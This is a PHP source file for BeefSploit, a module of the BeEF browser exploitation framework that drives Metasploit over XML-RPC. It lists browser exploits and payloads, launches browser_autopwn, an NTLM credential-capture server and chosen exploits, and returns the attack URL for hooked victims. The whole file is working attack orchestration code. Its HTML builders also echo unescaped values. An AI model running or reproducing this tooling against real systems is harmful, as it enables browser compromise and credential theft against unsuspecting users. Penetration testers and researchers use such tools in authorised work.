<?php
// PHP Module for BeefSploit
// By Ryan Linn (sussurro@happypacket.net)

require_once('../include/xmlrpc.inc.php');
require_once("../include/common.inc.php");
require_once("../include/msf_filter.inc.php");
include("../include/msf.inc.php");
session_start();

// set load error message
$msf_load_error	= '<select name="" id="loading" onChange="">';
$msf_load_error	.= '<option value="">Load Failed! Check Logs</option>';
$msf_load_error	.= '</select>';

$sock = FALSE;

// connect to msf
$sock = msf_connect(MSF_HOST,MSF_PORT);
if($sock === FALSE) { // check failure
	print $msf_load_error;
	exit;
}

// login to msf
$token = xmlrpc_msf_login($sock,MSF_USER,MSF_PASS);
if($token === FALSE) { // check failure
	print $msf_load_error;
	socket_close($sock);
	exit;
}

function close_socket_and_exit($sock) {
	if( !($sock === FALSE) ) {
		socket_close($sock);
	}
	exit();
}

if($_GET["action"] == "getexploits") { // get exploits
	
	get_exploits($sock, $token);

} elseif($_GET["action"] == "getpayloads" && $_GET["exploit"]) { // get payloads

	$exploit = get_and_filter_exploit();
	if(!$exploit) close_socket_and_exit($sock);

	get_payloads($sock,$token,$exploit);

} elseif($_GET["action"] == "getoptions" && $_GET["exploit"] && $_GET["payload"]) { // get options

	$exploit = get_and_filter_exploit();
	if(!$exploit) close_socket_and_exit($sock);
	$payload = get_and_filter_payload();
	if(!$payload) close_socket_and_exit($sock);	

	get_options($sock, $token, $exploit, $payload);

} elseif($_GET["action"] == "smbchallengecapture") { // execute smb capture
	
	$options = get_and_filter_smb_capture_options();
	if(!$options) close_socket_and_exit($sock);	
	$options["LOGFILE"] = TMP_DIR . 'logfile';
	$options["PWFILE"] = TMP_DIR . 'pwfile';
	
	execute_smb_capture($sock, $token, $options);
	
} elseif($_GET["action"] == "browserautopwn") { // execute smb capture
	
	$options = get_and_filter_module_options();
	if(!$options) close_socket_and_exit($sock);	
	
	execute_browser_autopwn($sock, $token, $options);
	
} elseif($_GET["action"] == "exploit") {
	
	$options = get_and_filter_module_options();
	if(!$options) close_socket_and_exit($sock);	
	$exploit = get_and_filter_exploit();
	if(!$exploit) close_socket_and_exit($sock);
	
	execute_module($sock, $token, $exploit, $options);
}

socket_close($sock);

// --[ XMLRPC GET EXPLOITS
// get msf exploits via xmlrpc request
function xmlrpc_get_exploits($sock, $token) {

	if(!$sock || !$token ) {
		$error = "MSF get exploit error:\n";
		$error .= "- Socket and/or Token failed";
		beef_log($error, $error);
		return FALSE;
	}

	// construct request
	$msg = new xmlrpcmsg("module.exploits",
		array(  new xmlrpcval($token,"string")));
	$string = $msg->serialize() . "\0";

	// send request
	socket_write($sock,$string);

	// get response
	$resp = "";
	while(!preg_match("/\/methodResponse/",$resp)) {
		$resp .= socket_read($sock,2048);
	}
	$resp = str_replace("\0","",$resp);

	$t = php_xmlrpc_decode_xml($resp);

	// check error
	if($t->errno) {
		$error = "MSF get exploit error:\n";
		$error .= "- Response from MSF Failed";
		beef_log($error, $error);
		return FALSE;
	}
	$val = $t->val;
	
	// extract exploits from response
	$modules = $val->structMem("modules");
	$exploits = array();
	for($i = 0; $i < $modules->arraySize(); $i++) {
		$value = $modules->arrayMem($i);
		if(preg_match("/browser/",$value->scalarVal())) {
			array_push($exploits,$value->scalarVal());
		}
	}
	
	return $exploits;
}

function get_exploits($sock, $token) {
	
	// get exploits
	$exploits = xmlrpc_get_exploits($sock, $token);
	
	if($exploits === FALSE) {
		print "fail";
	} else {
		$html_select = construct_select('exploit', $exploits, 'msf_get_payload_list()');
		print $html_select;
	}
}

function get_payloads($sock, $token, $exploit) {
	
	$payloads = xmlrpc_get_payloads($sock,$token,$exploit);

	if($payloads === FALSE) {
		print "fail";
	} else {
		$html_select = construct_select('payload', $payloads, 'msf_get_options()');
		print $html_select;
	}
}

function get_options($sock, $token, $exploit, $payload) {
	
	// get all options
	$exp_opt = xmlrpc_get_options($sock, $token, "exploit", $exploit);
	$pay_opt = xmlrpc_get_options($sock, $token, "payload", $payload);

	$full_options = array_merge($exp_opt, $pay_opt);

	print construct_options_form($full_options);
}

function execute_smb_capture($sock, $token, $options) {
	
	// set the module to use
	$module = "server/capture/http_ntlm";
	
	$result = xmlrpc_execute_module($sock, $token, $module, "auxiliary", $options);
	
	if($result === FALSE) {
		print "fail";
		return;
	} 
	
	$url = MSF_BASE_URL . ":" . $options["SRVPORT"] . "/" . $options["URIPATH"];
	
	if( ! valid_url_without_query($url) ){
		print "fail";
		return;
	}
	
	beef_log("SMB Exploit Launched", "SMB Exploit Launched. Waiting for Metasploit to send URL");
	print $url; 
	
}

function execute_browser_autopwn($sock, $token, $options) {
	
	// set the module to use
	$module = "server/browser_autopwn";
	
	$result = xmlrpc_execute_module($sock, $token, $module, "auxiliary", $options);
	
	if($result === FALSE) {
		print "fail";
		return;
	} 
	
	$url = MSF_BASE_URL . ":" . $options["SRVPORT"] . "/" . $options["URIPATH"];
	
	if( ! valid_url_without_query($url) ){
		print "fail";
		return;
	}

	beef_log("Autopwn Exploit Launched", "Autopwn Exploit Launched. Waiting for Metasploit to send URL");
	print $url; 
	
}

function execute_module($sock, $token, $module, $options) {
	
	$result = xmlrpc_execute_module($sock, $token, $module, "exploit", $options);
	
	if($result === FALSE) {
		print "fail";
		return;
	} 
	
	$url = MSF_BASE_URL . ":" . $options["SRVPORT"] . "/" . $options["URIPATH"];
	
	if( ! valid_url_without_query($url) ){
		print "fail";
		return;
	}

	beef_log("Exploit ($module) Launched", "Exploit ($module) Launched. Waiting for Metasploit to send URL");
	print $url;

}

// --[ XMLRPC GET PAYLOADS
// get msf payloads via xmlrpc request
function xmlrpc_get_payloads($sock, $token, $exploit) {
	
	if(!$sock || !$token || !$exploit) {
		$error = "MSF get payloads error:\n";
		$error .= "- Socket, Token and/or Exploit failed";
		beef_log($error, $error);
		return FALSE;
	}

	// construct request 
	$msg = new xmlrpcmsg("module.compatible_payloads",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval($exploit,"string")));
	$string = $msg->serialize() . "\0";

	// send request
	socket_write($sock,$string);
	
	// get response
	$resp = "";
	$resp .= socket_read($sock, 32768);
	$resp = str_replace("\0","",$resp);
	
	$t = php_xmlrpc_decode_xml($resp);

	// check error
	if($t->errno) {
		return FALSE;
	}
	$val = $t->val;
	
	// extract payloads from response
	$modules = $val->structMem("payloads");
	$payloads = array();
	for($i = 0; $i < $modules->arraySize(); $i++) {
		$value = $modules->arrayMem($i);
		array_push($payloads,$value->scalarVal());
	}
	
	return $payloads;
}

// --[ XMLRPC GET OPTIONS
// get msf options via xmlrpc request
function xmlrpc_get_options($sock, $token, $type, $module) {
	
	if(!$sock || !$token || !$type || !$module) {
		$error = "MSF get options error:\n";
		$error .= "- Socket, Token, Type and/or Module failed";
		beef_log($error, $error);
		return FALSE;
	}
	
	// construct request
	$msg = new xmlrpcmsg("module.options",
		array(  new xmlrpcval($token,"string"),
			new xmlrpcval($type,"string"),
			new xmlrpcval($module,"string")
			));
	$string = $msg->serialize() . "\0";

	// send request
	socket_write($sock,$string);
	
	// get response
	$resp = "";
	$resp .= socket_read($sock,32768);
	$resp = str_replace("\0","",$resp);
	
	$t = php_xmlrpc_decode_xml($resp);
	
	// check error
	if($t->errno) {
		$error = "MSF get options error:\n";
		$error .= "- Response from MSF Failed";
		beef_log($error, $error);
		return FALSE;
	}
	
	// extract options from response
	$val = $t->val;
	$val->structreset();
	$options = array();	
	while(list($key,$v) = $val->structEach()) {
		$v->structreset();
		$options[$key] = array();
		while(list($k,$v2) = $v->structEach()) {
			$options[$key][$k] = $v2->scalarVal();
		}
	}

	return $options;
}

// --[ XMLRPC EXECUTE MODULE
// launch metasploit module
function xmlrpc_execute_module($sock, $token, $module, $type, $options) {
	
	if(!$sock || !$token || !$module || !$type || !$options || !is_array($options)) {
		$error = "MSF execute module error:\n";
		$error .= "- Socket, Token, Name, Type and/or Options failed";
		beef_log($error, $error);
		return FALSE;
	}
	
	// create request
	$optval = new xmlrpcval;
	$o = array();

	foreach ($options as $k => $v) {
		$o[$k] = new xmlrpcval($v,"string");
	}

	$optval->addStruct($o);
	
	$msg = new xmlrpcmsg("module.execute", // method name
		array(  new xmlrpcval($token,"string"), // params
			new xmlrpcval($type,"string"),
			new xmlrpcval($module,"string"), // metasploit module
			$optval)); 
	$string = $msg->serialize() . "\0";

	// send request
	socket_write($sock,$string);
	$resp = socket_read($sock,2048);
	$resp = str_replace("\0","",$resp);
	$t = php_xmlrpc_decode_xml($resp);

	// check error
	if($t->errno) {
		$error = "MSF execute module error:\n";
		$error .= "- Calling $module failed";
		beef_log($error, $error);
		return FALSE;
	}
	
	return TRUE;
}

// --[ MSF LOGIN
// login to metasploit via xml rpc and return token
function xmlrpc_msf_login($sock, $username, $password)
{
	// create login request
	$msg = new xmlrpcmsg("auth.login",
		array(new xmlrpcval($username,"string"),
		new xmlrpcval($password,"string")));
	$string = $msg->serialize() . "\0";

	// send login request
	socket_write($sock,$string);
	// get login response
	$resp = socket_read($sock, 2048);
	$resp = str_replace("\0","",$resp);
	$t = php_xmlrpc_decode_xml($resp);

	// check if login failed
	if($t->errno) {
		$login_error = "MSF login error:\n";
		$login_error .= "- Check MSF_USER and MSF_PASS settings are correct";
		beef_log($login_error, $login_error);
		return FALSE;
	}

	// login successful so return session token
	$token = $t->val->structmem("token");
	return $token->scalarval();
}
	
// --[ MSF CONNECT
// create tcp connection to msf
function msf_connect($host, $port)
{
	if(!$host) {
		$connect_error = "MSF connect error:\n";
		$connect_error .= "- Invalid MSF_HOST variable setting";
		beef_log($connect_error, $connect_error);
		return FALSE;
	}

	if(!$port) {
		$connect_error = "MSF connect error:\n";
		$connect_error .= "- Invalid MSF_PORT variable setting";
		beef_log($connect_error, $connect_error);
		return FALSE;
	}
	
	$sock = @socket_create(AF_INET,SOCK_STREAM,SOL_TCP);

	if($sock == FALSE) {
		$connect_error = "MSF connect error:\n";
		$connect_error .= "- Create socket failed";
		beef_log($connect_error, $connect_error);
		return FALSE;
	}

	$connected = @socket_connect($sock,$host,$port);

	if(!$connected) {
		$connect_error = "MSF connect error:\n";
		$connect_error .= "- Cannot connect to MSF: " . $host . ":" . $port;
		beef_log($connect_error, $connect_error);
		return FALSE;
	}

	return $sock;
}

// --[ CONSTRUCT SELECT
// construct a html select from array	
function construct_select($name, $values, $onchange) {
	
	sort($values);
	
	// start select 
	$return_select = '<select name="' . $name . '" id="' . $name . '" onChange="'. $onchange . ';">\n';
	
	foreach ($values as $value) {
		$return_select .= '<option value="' . $value . '">' . $value . '</option>\n';
	}
	
	// terminate select
	$return_select .= "</select>\n";
	
	return $return_select . "\n";
}

// --[ CONTRUCT OPTIONS FORM
// create a html exploit options form
function construct_options_form($options) {
	
	$options_form = "";
	
	// contruct options to be displayed to in browser
	foreach($options as $key=>$value) {
		
		// don't display advanced, evasion and boolean options
		if($value["advanced"] == 1 || $value["evasion"] == 1 || $value["type"] == "bool") {
			continue;
		}
		
		// create heading
		$options_form .= "<div id=\"module_subsection_header\">";
		
		$options_form .= "$key";
		
		if($value["required"] == 1)	{
			$options_form .= " (required)";
		}
		
		$options_form .= ": </div>\n";
		
		// create discription
		$options_form .= $value["desc"] . "<br>";
		
		// create input box
		$options_form .= "<input type=\"text\" name=\"$key\" value=\"".$value["default"] ."\"/>\n";
	}
	
	return $options_form;
}

?>
